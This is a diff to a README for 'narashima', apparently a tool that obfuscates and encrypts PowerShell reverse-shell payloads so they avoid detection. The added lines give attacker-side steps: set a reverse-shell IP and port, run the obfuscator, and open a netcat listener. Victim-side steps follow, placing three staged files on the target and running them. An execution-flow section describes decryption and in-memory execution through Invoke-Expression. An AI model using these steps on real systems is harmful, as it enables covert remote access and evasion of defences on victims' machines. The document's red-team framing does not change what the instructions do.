@@ -31,14 +31,26 @@
 
 ## 🚀 Usage
 
+### Attacker side
+
+- Modify any Powershell script inside shell/* and change the IP and Port for reverse shell
+
 ```bash
 
 pip3 install -r requirements.txt (recommended above or equal to python 3.12.x)
 
 chmod +x narashima
 
-./narashima -o /tmp/rev.ps1 -s -d -n -x -i -f -b --decimal -l 2 --random-backticks  --key "secret123" /shell/Invoke-PowerShellTcp.ps1
+./narashima -o /tmp/rev.ps1 -s -d -n -x -i -f -b --decimal -l 2 --random-backticks  --key "<your-secret-key>" /shell/Invoke-PowerShellTcp.ps1
 ```
+- open the listening port on your machine
+
+```bash
+nc -lvnp <port>
+```
+
+
+### Victim side
 
 - Now the exe will give three files (file.ps1, god.txt, god-killer.txt)
 - Place all three files on the victim machine and run file.ps1
@@ -89,17 +101,15 @@ This allows red teamers to safely use zero-detection payloads without exposing t
 
 ## 🧠 Execution Flow
 
-1. **cmd.ps1**  
-   - Prompts the user for XOR decryption key  
-   - Decrypts and base64-decodes `launcher.txt`
+1. **file.ps1**   
+   - Base64-decodes `god.txt`
 
-2. **launcher.ps1**  
-   - Decodes the content of `launcher.txt`  
+2. **god.txt**  
+   - Decrypt with secret key and decodes the content of `god-killer.txt`  
    - Executes it using `Invoke-Expression`
 
-3. **payload.txt**  
+3. **god-killer.txt**  
    - Final payload: encrypted, base64-encoded, obfuscated  
-   - Executed in-memory without touching disk
 
 ```
 cmd.ps1 
